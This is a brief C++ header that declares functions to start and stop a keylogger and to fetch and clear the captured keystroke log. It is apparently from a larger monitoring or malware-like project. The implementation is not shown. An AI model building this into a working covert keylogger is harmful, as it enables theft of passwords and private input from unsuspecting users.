#pragma once
#include <string>

namespace capture {
    void StartKeylogger();
    void StopKeylogger();
    std::string GetAndClearKeylog();
}
